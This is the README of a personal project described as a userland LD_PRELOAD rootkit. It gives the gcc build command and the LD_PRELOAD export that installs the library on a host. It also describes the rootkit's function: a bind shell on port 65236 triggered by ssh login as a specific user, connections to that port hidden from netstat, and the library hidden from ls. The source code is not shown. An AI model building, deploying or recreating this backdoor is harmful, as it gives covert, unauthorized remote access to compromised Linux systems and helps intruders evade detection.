# linux-syscall-hooking
this is a userland rootkit that uses LD_PRELOAD to hook syscall functions. 

this is one of my practice to learn C. 

first you need to compile it with the following command using gcc.

```
linux# gcc mallib.c -fPIC -shared -D_GNU_SOURCE -o mallib.so -ldl 
```
then add its address to LD_PRELOAD enviroment variable.
```
linux# export LD_PRELOAD=$(pwd)/mallib.so 
```
## how it works:
when you ssh with user ```whatsupali``` to infected host it opens a bind shell on port 65236 and hides connections to this port from netstat. it also hides it self from ```ls``` command. 
